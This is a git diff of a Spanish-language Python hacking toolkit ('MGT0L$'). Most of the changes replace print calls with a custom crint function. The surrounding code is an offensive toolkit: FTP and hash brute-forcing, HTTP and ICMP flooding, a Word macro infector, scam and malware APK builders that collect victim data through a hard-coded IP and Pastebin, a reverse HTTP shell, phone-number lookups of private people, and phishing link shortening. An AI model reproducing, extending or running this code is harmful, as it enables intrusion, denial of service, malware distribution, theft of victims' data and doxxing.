@@ -91,7 +91,7 @@ async def translate_as(text):
         
     except Exception as err:
 
-        print(f"[ERROR] {err}\n[AUTOCONFIG] Idioma reestablecido a: Spanish")
+        crint(f"[ERROR] {err}\n[AUTOCONFIG] Idioma reestablecido a: Spanish")
         root_json["lang"] = "es"
         with open(".root", "w", encoding="utf-8") as emergency_mod:
             emergency_mod.write(str(root_json).replace("'", '"'))
@@ -123,7 +123,7 @@ def update():
                 return "[PASS] MGT0L$ Esta actualizado a su version mas reciente ..."
             
     except Exception as err:
-        print(f"[ERROR] {err}")
+        crint(f"[ERROR] {err}")
 
 ###################################################################
 
@@ -155,12 +155,12 @@ def findperson(nombre, arg): # Funciona with
                 palabra=palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT")
 
                 if "CONTENT:[]" in palabra:
-                    return "[ERROR] {} DNI No encontrada ...".format(nombre)
+                    crint("[ERROR] {} DNI No encontrada ...".format(nombre))
 
                 else:
-                    palabra = palabra.replace("CONTENT:",f"[PASS] =>> Posible coincidencia DNI de {nombre}: ").split("\n")
-                    return palabra[0]
-
+                    palabra = palabra.replace("CONTENT:",f"Posible coincidencia DNI de {nombre}: ").split("\n")
+                    crint("[PASS] =>> "+palabra[0])
+                break
                 #print(palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT"))
 
 
@@ -209,7 +209,7 @@ def findperson(nombre, arg): # Funciona with
 
         os.remove("a.txt")
 
-        return limpieza(resultados)
+        limpieza(resultados)
 
 
     ##### PRINCIPAL CODE
@@ -263,9 +263,9 @@ def findperson(nombre, arg): # Funciona with
     }
 
     try:
-        print(geo())
+        geo()
     except Exception as err:
-        print(f"[ERROR] {err}")
+        crint(f"[ERROR] {err}")
         pass
 
 def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with
@@ -308,13 +308,13 @@ def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with
         #conect.login(user=usuario,passwd=password) # TimeoutError
 
         except TimeoutError:
-            print(f"[ERROR] Servidor no esta respondiendo en =>> [U]-{usuario}-[P]-{password}")
+            crint(f"[ERROR] Servidor no esta respondiendo en =>> [U]-{usuario}-[P]-{password}")
         except (error_temp, error_perm, error_reply):
-            print(f"[INFO] Usuario y contraseña erroneos =>> [U]-{usuario}-[P]-{password}")
+            crint(f"[INFO] Usuario y contraseña erroneos =>> [U]-{usuario}-[P]-{password}")
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
         else:
-            print(f"[PASS] Usuario y contraseña correctos =>> [U]-{usuario}-[P]-{password}")
+            crint(f"[PASS] Usuario y contraseña correctos =>> [U]-{usuario}-[P]-{password}")
             exit(0)
             
 
@@ -338,7 +338,7 @@ def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with
                     password=password.strip()
                     vector(usuario,password,ftpserver)
         
-        print("[ERROR] No se logro encontrar ninguna coincidencia ...")
+        crint("[ERROR] No se logro encontrar ninguna coincidencia ...")
                 
 
 
@@ -347,7 +347,7 @@ def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with
 
     #try:
     limpieza()
-    print(f"[INFO] Empezando ataque en =>> {ftpserver}")
+    crint(f"[INFO] Empezando ataque en =>> {ftpserver}")
     ataque(usuario, ftpserver)
 
     #except:
@@ -423,7 +423,7 @@ def httpflood(URL):
                 cookie_generator()
                 test=requests.get(URL, headers=headers, cookies=cookies) # UTILIZA POST SI ES VUL
                 status_max=test.status_code
-                print("[INFO] Buscando peso de Payload =>> [{}] STATUS [{}]".format(BYTESEND,status_max))
+                crint("[INFO] Buscando peso de Payload =>> [{}] STATUS [{}]".format(BYTESEND,status_max))
                 
                 if status_max != 200:
                     BYTESEND=BYTESEND-1
@@ -433,27 +433,27 @@ def httpflood(URL):
 
                     terminal=1048576/proceso
 
-                    print(f"[INFO] Tamaño del Payload {round(proceso/1024,2)}KB =>> [200]\n[SET] En {round(terminal)} Solicitudes hay =>> 1MB")
+                    crint(f"[INFO] Tamaño del Payload {round(proceso/1024,2)}KB =>> [200]\n[SET] En {round(terminal)} Solicitudes hay =>> 1MB")
                     time.sleep(5)
                 else:
                     BYTESEND=BYTESEND+1
 
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
             exit(0)
         try:
             cookie_generator()
             atak=requests.get(URL, headers=headers, data=headers, cookies=cookies) # UTILIZA POST SI ES VUL
             
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
             exit(0)
         else:
 
             if atak.status_code != 200:
-                print("[INFO] URL =>> {} STATUS =>> [{}]".format(URL, atak.status_code))
+                crint("[INFO] URL =>> {} STATUS =>> [{}]".format(URL, atak.status_code))
             else:
-                print("[PASS] URL =>> {} STATUS =>> [{}]".format(URL, atak.status_code))
+                crint("[PASS] URL =>> {} STATUS =>> [{}]".format(URL, atak.status_code))
 
 def icmpdos(ip, pack):
 
@@ -489,7 +489,7 @@ def iplocate(ip):
     try:
         localizando=requests.get(f"https://ipinfo.io/widget/demo/{ip}", headers=headers)
     except Exception as err:
-        print(f"[ERROR] {err}")
+        crint(f"[ERROR] {err}")
         pass
     else:
         print(limpieza(localizando.text))
@@ -510,20 +510,21 @@ def lopiapi(numero):
             json=json.replace("]", "")
             json=json.upper()
             
-            return json
+            print("\n"+json)
             
         else:
-            return "[ERROR] Numero no encontrado..."
+            crint("[ERROR] Numero no encontrado ...")
 
     try:
         consulta=requests.get("https://api-lipiapp.lipigas.cl/wapi/no_auth/usuarios/terminos/{}".format(numero))
         
         consulta_n=requests.get("https://api-lipiapp.lipigas.cl/wapi/clientes?telefono={}&pais=cl&segmento=1".format(numero))
                             
-        print("\n"+legible(consulta.text)+"\n"+legible(consulta_n.text)+"\n")
+        legible(consulta.text)
+        legible(consulta_n.text)
     
     except Exception as err:
-        print(f"[ERROR] {err}")
+        crint(f"[ERROR] {err}")
 
 def macromaker():
 
@@ -536,7 +537,7 @@ def macromaker():
         escribe.write(lec)
         escribe.close()
 
-        return "[PASS] =>> MACRO.VB" 
+        crint("[PASS] =>> MACRO.VB") 
 
         
     macro_in_cache="""
@@ -605,13 +606,13 @@ End Sub
                 pass
             else:
                 try:
-                    print(down())
+                    down()
                 except Exception as err:
-                    print(f"[ERROR] {err}")
+                    crint(f"[ERROR] {err}")
                     pass
         
         if selec == 2:
-            print("[INFO] Esta opcion esta en desarrollo ...")
+            crint("[INFO] Esta opcion esta en desarrollo ...")
 
 def seeker(usuario): # Funciona with
 
@@ -624,7 +625,7 @@ def seeker(usuario): # Funciona with
 
     except Exception as err:
 
-        print(f"[ERROR] {err}")
+        crint(f"[ERROR] {err}")
         exit(0)
     
 
@@ -711,7 +712,7 @@ def seeker(usuario): # Funciona with
 
         while True:
             
-            print("[INFO] Tipo de busqueda =>> [URL] to [{}]\n[Buscando en 800 <sitios>]".format(usuario))
+            crint("[INFO] Tipo de busqueda =>> [URL] to [{}]\n[Buscando en 800 <sitios>]".format(usuario))
             
             #leer=open(".bdd")
             #lectura=leer.readlines()
@@ -733,7 +734,7 @@ def seeker(usuario): # Funciona with
                             save.write("\n[URL] "+word)
                         #a=soli.status_code
                         
-                        print("[URL] {}\n[{}]".format(word,status_codes.get(soli.status_code)))
+                        crint("[URL] {}\n[{}]".format(word,status_codes.get(soli.status_code)))
 
                     except KeyboardInterrupt:
                         save.close()
@@ -750,7 +751,7 @@ def seeker(usuario): # Funciona with
             break
 
     def siguiente():
-        print("[INFO] Tipo de busqueda =>> [IN WEB] to [{}]\n".format(usuario))
+        crint("[INFO] Tipo de busqueda =>> [IN WEB] to [{}]\n".format(usuario))
 
         head_up={
             "User-Agent": "{}".format(random_usera.get(random.randint(1,10)))
@@ -781,7 +782,7 @@ def seeker(usuario): # Funciona with
                     palabra=str(word.get("href")) # Obtengo la etiqueta especifica href
 
                     if "https://" in palabra:
-                        print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
+                        crint("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
                         save.write("\n[URL] {}".format(palabra))
                     
                     if "first=" in palabra:
@@ -803,10 +804,10 @@ def seeker(usuario): # Funciona with
                             palabra=str(word_soup.get("href"))
 
                             if "https://" in palabra:
-                                print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
+                                crint("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
                                 save.write("\n[URL] {}".format(palabra)) ##########################
 
-            print("[INFO] Datos de {} guardados en capture.txt ...".format(usuario))
+            crint("[INFO] Datos de {} guardados en capture.txt ...".format(usuario))
             exit(0)
 
     buscador(usuario)
@@ -878,7 +879,7 @@ def tempmail(correo, selec):
         except:
             pass
         else:
-            print("[PASS] Correo {}@mailnesia.com =>> [LISTO PARA USAR] =>> [INFO] Mensajes: [{}]".format(correo, push))
+            crint("[PASS] Correo {}@mailnesia.com =>> [LISTO PARA USAR] =>> [INFO] Mensajes: [{}]".format(correo, push))
 
             if push > 0 and selec != None:
                 
@@ -888,7 +889,7 @@ def tempmail(correo, selec):
                 sopa=BeautifulSoup(get_mensaje.text, "html.parser")
 
                 print(limpieza(sopa.get_text()))
-                print("[INFO] =>> {}".format(check_final.get(selec)))             
+                crint("[INFO] =>> {}".format(check_final.get(selec)))             
 
 def unzipper(dic, directiorio_archivo): # Funciona with
 
@@ -918,23 +919,23 @@ def unzipper(dic, directiorio_archivo): # Funciona with
                     try:
                         # Intenta extraer usando la contraseña
                         filesx.extractall("unzipper/", pwd=password.encode("utf-8"))
-                        print(f"[PASS] Contraseña encontrada: {password}")
+                        crint(f"[PASS] Contraseña encontrada: {password}")
                         #exit(0)  # Sale de la función si la contraseña es correcta
                     except:
-                        print(f"[ERROR] Contraseña incorrecta: {password}")
+                        crint(f"[ERROR] Contraseña incorrecta: {password}")
 
     try:
         limpieza()
     except:
-        print("[ERROR] Diccionario no existente ...")
+        crint("[ERROR] Diccionario no existente ...")
         pass
     
     try:
         crack()
     except NotImplementedError:
-        print("[ERROR] Formato de compresion no soportado ...")
+        crint("[ERROR] Formato de compresion no soportado ...")
     except FileNotFoundError:
-        print("[ERROR] Archivo dañado o no existente ...")
+        crint("[ERROR] Archivo dañado o no existente ...")
     except:
         pass
 
@@ -972,7 +973,7 @@ def webdumper(select, url, dic_path): # Funciona with
             archivo_dic.close()
 
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
 
     def inicial_find(url, dic_path):
 
@@ -1014,7 +1015,7 @@ def webdumper(select, url, dic_path): # Funciona with
                     if url_100 != url and [url_100, finder.status_code, sig] not in getted:
                         getted.append([url_100, finder.status_code, sig]) # Se agrega a la variable si se encuentra algo funcional
 
-                print(f"[INFO] {url_100} =>> {finder.status_code}")
+                crint(f"[INFO] {url_100} =>> {finder.status_code}")
 
     def recursive_find(dic_path, tipo):
 
@@ -1023,13 +1024,13 @@ def webdumper(select, url, dic_path): # Funciona with
             if tipo == "path":
                 for url in getted:
                     if not any(ext in url[0] for ext in extensiones_comunes):
-                        print(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
+                        crint(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                         inicial_find(url[0], dic_path)
             
             elif tipo == "arch":
                 for url in getted:
                     if not any(ext in url[0] for ext in extensiones_comunes):
-                        print(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
+                        crint(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                         inicial_find(url[0], dic_path)
 
 
@@ -1053,13 +1054,13 @@ def webdumper(select, url, dic_path): # Funciona with
         if getted != []:
             print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
         else:
-            print("[ERROR] No se han encontrado directorios ocultos ...")
+            crint("[ERROR] No se han encontrado directorios ocultos ...")
             
     except KeyboardInterrupt:
         print("\n")
         print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
     except ValueError:
-        print("[ERROR] Caracter no valido ...")
+        crint("[ERROR] Caracter no valido ...")
 
 def wordinfect(ruta, macro):
 
@@ -1093,10 +1094,10 @@ def wordinfect(ruta, macro):
             except:
                 pass
             else:
-                print("[PASS] Word infectado guardado en =>> {}".format(ruta_save))
+                crint("[PASS] Word infectado guardado en =>> {}".format(ruta_save))
     
     else:
-        print(translate("[ERROR] Wordinfect aun no disponible en Termux ..."))
+        crint(translate("[ERROR] Wordinfect aun no disponible en Termux ..."))
 
 def sc4pk(idcap, selec):
 
@@ -1145,21 +1146,21 @@ def sc4pk(idcap, selec):
             shutil.move(os.path.join("Scam_2", "res", "drawable-xhdpi-v4", f"{REMP}.png"), os.path.join("Scam_2", "res", "drawable-xhdpi-v4", "app_icon.png"))
 
             if "win" in SYS_GLOBAL:
-                print(f"[PASS] Comprime la APK que se encuentra en:\n[PATH] {ROOT_MAX}/ ->> Scam_2/")
+                crint(f"[PASS] Comprime la APK que se encuentra en:\n[PATH] {ROOT_MAX}/ ->> Scam_2/")
             else:
                 os.chdir("Scam_2/")
                 os.system("zip -r Lite.apk *")
-                print(f"[PASS] APK Sin firma guardado en:\n[PATH] {ROOT_MAX}Scam_2/ ->> Lite.apk")
+                crint(f"[PASS] APK Sin firma guardado en:\n[PATH] {ROOT_MAX}Scam_2/ ->> Lite.apk")
 
             #shutil.move("main.xml", "Scam_2/res/layout/main.xml") 
 
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
             pass
         
         else:
             #print()
-            print("[PASS] =>> Tarea terminada con exito ...")
+            crint("[PASS] =>> Tarea terminada con exito ...")
             exit(0)
 
     def obtener(idcap):
@@ -1169,7 +1170,7 @@ def sc4pk(idcap, selec):
         try:
             obtiene=requests.get("http://192.71.249.244:60001/comments")
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
             pass
         else:
 
@@ -1199,16 +1200,16 @@ def sc4pk(idcap, selec):
                     word=word.replace(idcap,"").replace(" ","").replace("</div>]","")
                     #print(word)
                     try:
-                        print(f"[INFO] Tu ID Hex =>> [{CONTADOR}]")
+                        crint(f"[INFO] Tu ID Hex =>> [{CONTADOR}]")
                         word=str(codecs.decode(word,"hex"))
                         print(word.replace("\\n","\n").replace("b'","[TARGET]->> SCAM.APK ->> ").replace("#'","\n").replace("%40","@").replace("%C3%B1","ñ"))
                     
                     except Exception as err:
-                        print(f"[ERROR] {err}")
+                        crint(f"[ERROR] {err}")
                         exit(0)
 
             if chek == False:
-                print("[ERROR] No se lograron encontrar victimas asociadas a tu ID ...")
+                crint("[ERROR] No se lograron encontrar victimas asociadas a tu ID ...")
                 exit(0)
 
             temp.close()
@@ -1229,7 +1230,7 @@ def sc4pk(idcap, selec):
         crear(selec, idcap)
     
     else:
-        print("[ERROR] Opcion ingresada no valida ...")
+        crint("[ERROR] Opcion ingresada no valida ...")
     
     if selec == None:
         
@@ -1244,7 +1245,7 @@ def urljump(select, cant):
         if saved_ != []:
             print("\n",tabulate(saved_, headers=["ENLACES ENCONTRADOS"]))
         else:
-            print(f"---------------------\n[ERROR] No encontramos ningun enlace valido ...")
+            crint(f"---------------------\n[ERROR] No encontramos ningun enlace valido ...")
         exit(0)
 
     
@@ -1259,10 +1260,10 @@ def urljump(select, cant):
                 ch_ = requests.get(url_chk, headers=headers)
                 chk_label.append(ch_.status_code)
             except Exception as err:
-                print(f"[ERROR] {err}")
+                crint(f"[ERROR] {err}")
 
         if chk_label.count(429) == len(chk_label):
-            print("[ERROR] Conexion con el servidor perdida ->> [429]")
+            crint("[ERROR] Conexion con el servidor perdida ->> [429]")
             exit_emer_()
 
     # 0 = wsp 1 = discord 2 = telegram
@@ -1282,7 +1283,7 @@ def urljump(select, cant):
 
     if select in chk_ and cant > 0:
 
-        print(f"[INFO] Generando {select.upper()} links =>> [{cant}]\n---------------------")
+        crint(f"[INFO] Generando {select.upper()} links =>> [{cant}]\n---------------------")
 
         select = chk_[select]#; select = int(select)
         url = [
@@ -1319,7 +1320,7 @@ def urljump(select, cant):
             except KeyboardInterrupt:
                 exit_emer_()
             except Exception as err:
-                print(f"[ERROR] {err}")
+                crint(f"[ERROR] {err}")
                 exit_emer_()
 
             """
@@ -1334,16 +1335,16 @@ def urljump(select, cant):
                 not_429(f"https://{url[select][0]}{url_s}")
 
             if url[select][2] not in soli.text:
-                print(f"[PASS] https://{url[select][0]}{url_s} ->> [{soli.status_code}] ✓")
+                crint(f"[PASS] https://{url[select][0]}{url_s} ->> [{soli.status_code}] ✓")
                 saved_.append([f"https://{url[select][0]}{url_s}"])
 
             else:
-                print(f"[INFO] https://{url[select][0]}{url_s} ->> [{soli.status_code}]")
+                crint(f"[INFO] https://{url[select][0]}{url_s} ->> [{soli.status_code}]")
         
         exit_emer_()
     
     else:
-        print("[ERROR] Opcion no encontrada ...")
+        crint("[ERROR] Opcion no encontrada ...")
 
 def unlocker(type_, dictionary, hash_):
     type_ = type_.lower()
@@ -1357,19 +1358,19 @@ def unlocker(type_, dictionary, hash_):
 
                     unl_ = md5(match_.encode("utf-8")).hexdigest()
                     if unl_ == hash_:
-                        print(f"[PASS] {match_} <---✓---> {unl_}")
+                        crint(f"[PASS] {match_} <---✓---> {unl_}")
                         exit(0)
                 
                 if type_ == "sha1":
                     unl_ = sha1(match_.encode("utf-8")).hexdigest()
                     if unl_ == hash_:
-                        print(f"[PASS] {match_} <---✓---> {unl_}")
+                        crint(f"[PASS] {match_} <---✓---> {unl_}")
                         exit(0)
                 
-                print(f"[INFO] {match_} <---x---> {unl_}")
+                crint(f"[INFO] {match_} <---x---> {unl_}")
 
     except Exception as err:
-        print(f"[ERROR] {err}")
+        crint(f"[ERROR] {err}")
 
 def m4cware():
 
@@ -1448,7 +1449,7 @@ def m4cware():
             try:
                 paste = requests.post("https://pastebin.com/api/api_post.php", data=params); paste_ = str(paste.text).splitlines()  # Se obtiene y se guarda en una variable los resultados
             except Exception as err:
-                print(f"[ERROR] {err}")
+                crint(f"[ERROR] {err}")
 
             if len(paste_) > 5:
 
@@ -1482,9 +1483,9 @@ m4cware->> """))
                                     file_sv = file_sv + str(file_dw.text) + "\n"
                                 with open("targets.txt", "w", encoding="utf-8") as file_fl:
                                     file_fl.write(file_sv)
-                                print("[PASS] Archivo targets.txt descargado correctamente ...")
+                                crint("[PASS] Archivo targets.txt descargado correctamente ...")
                             except Exception as err:
-                                print(f"[ERROR] {err}")
+                                crint(f"[ERROR] {err}")
 
                         if select == 2:
                             select = int(input(f"VICTIMS SELECT // [{len(get_url)}/{len(get_url)}] ->> "))
@@ -1493,15 +1494,15 @@ m4cware->> """))
                                 print("---------------------------")
                                 print(file_dw.text.replace("{", "{\n").replace(",",",\n").replace('"};', '"\n};'))
                             except Exception as err:
-                                print(f"[ERROR] {err}")
+                                crint(f"[ERROR] {err}")
                         
                         if select == 99:
                             break
 
                     except Exception as err:
-                        print(f"[ERROR] {err}")
+                        crint(f"[ERROR] {err}")
             else:
-                print("[ERROR] Aun no se han encontrado victimas ...")
+                crint("[ERROR] Aun no se han encontrado victimas ...")
                 break
 
     def style_apk():
@@ -1540,7 +1541,7 @@ m4cware->> """))
                     LY_options[select-1][1] = ly_select
 
             except Exception as err:
-                print(f"[ERROR] {err}")
+                crint(f"[ERROR] {err}")
 
     def actions_apk():
 
@@ -1560,7 +1561,7 @@ m4cware->> """))
                     break
 
                 if AC_options[select-1][1] == True:
-                    print("[BUSY] Opcion ya implementada ...")
+                    crint("[BUSY] Opcion ya implementada ...")
 
                 if select == 1 and AC_options[0][1] == False: # Del file or Dir
                     ac_inp = input("Ingresa la ruta a eliminar: ")
@@ -1587,13 +1588,13 @@ m4cware->> """))
                 AC_options[select-1][1] = True # Se cambia el valor de la opcion a True indicando que ya se a realizado una opcion
                 # indicando asi que no se puede utilizar
             except Exception as err:
-                print(f"[ERROR] {err}")
+                crint(f"[ERROR] {err}")
 
     def compilar():
 
         try:
             if len(AC_map) == 4:
-                print("[ERROR] Aun no modificas el APK ...")
+                crint("[ERROR] Aun no modificas el APK ...")
 
             else:
                 dirs_ = os.listdir(".")
@@ -1611,7 +1612,7 @@ m4cware->> """))
                             apk_tool_bat.write(down_bat.content)
                 
                 except Exception as err:
-                    print(f"[ERROR] {err}")
+                    crint(f"[ERROR] {err}")
                 
                 if "m4.apk" not in dirs_:             # Importa el apk para trabajar mejor con ella
                     shutil.copy(os.path.join("assets", "m4.apk"), ".")
@@ -1754,11 +1755,11 @@ m4cware->> """))
                     shutil.rmtree("m4"); os.remove("m4.apk")  # Elimina los archivos ya ocupados
                     
                 except Exception as err:
-                    print(f"[ERROR] {err}")
+                    crint(f"[ERROR] {err}")
         
         except Exception as err:
             os.remove("m4.apk")
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
 
     def api_settings():
         while True:
@@ -1777,11 +1778,11 @@ Introduce tu 'api_dev_key' de Pastebin: """)
                     one_id["api_dev_key"] = new_dev; one_id["api_user_key"] = new_user
                     new_paste.write(str(one_id).replace("'", '"'))
 
-                print("[PASS] Claves ingresadas con exito ...")
+                crint("[PASS] Claves ingresadas con exito ...")
                 exit(0)
 
             except Exception as err:
-                print(f"[ERROR] {err}")
+                crint(f"[ERROR] {err}")
 
     while True:
         try:
@@ -1795,7 +1796,7 @@ OPTIONS ->> [MALWARE-APK-CREATOR]
 
 m4cware->> """))
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
         else:
             if select == 1:
                 style_apk()
@@ -1950,22 +1951,22 @@ WMIC           Muestra información de WMI en el shell de comandos interactivo.
                 if "win" not in SYS_GLOBAL:
 
                     try:
-                        print('[INFO] Servidor corriendo en =>> http://localhost:{}'.format(port))
+                        crint('[INFO] Servidor corriendo en =>> http://localhost:{}'.format(port))
                         os.system("php -S localhost:{} -t server".format(port))
 
                     except Exception as err:
-                        print(f"[ERROR] {err}")
+                        crint(f"[ERROR] {err}")
                         pass
                 else:
-                    print("[INFO] Abrir servidor con PHP aun esta en desarrollo ...")
+                    crint("[INFO] Abrir servidor con PHP aun esta en desarrollo ...")
 
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
 
     def maquina(server_str):
         pasado=""
 
-        print("[INFO] Esperando conexion ...")
+        crint("[INFO] Esperando conexion ...")
         while True:
             time.sleep(1)
 
@@ -2028,13 +2029,13 @@ WMIC           Muestra información de WMI en el shell de comandos interactivo.
                 leer_str = leer.read()
                 escribir.write(leer_str.replace("URL_FUN",server_str))
             
-            print("[PASS] Archivo guardado en ./server/reversehttp_clone.py")
-            print("-------------------------------------------------\n[INFO] Entrando en modo escucha [20sec] ...")
+            crint("[PASS] Archivo guardado en ./server/reversehttp_clone.py")
+            crint("-------------------------------------------------\n[INFO] Entrando en modo escucha [20sec] ...")
             time.sleep(20)
             maquina(server_str)
 
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
     
     server(url_port)
 
@@ -2072,7 +2073,7 @@ def shorty(rrss, url, sub):
     }
 
     if "://" not in url or url == None or rrss == None or rrss.lower() not in domains_:
-        print("[ERROR] Introduce una URL valida ...")
+        crint("[ERROR] Introduce una URL valida ...")
     
     else:
 
@@ -2085,11 +2086,11 @@ def shorty(rrss, url, sub):
                 #print(f"{key} => {dict_j[key]}".upper()) 
 
             if "success" in shorty_.text:
-                print(f'[PASS] Shorted URL =>> [{dict_j["short_url"]}]')
+                crint(f'[PASS] Shorted URL =>> [{dict_j["short_url"]}]')
             #print(shorty_.text)
 
         except Exception as err:
-            print(f"[ERROR] {err}")
+            crint(f"[ERROR] {err}")
 
 # python3 fsh.py urldump --a <social_network> --b <count> < ------------ in mgt0ls
 #################################
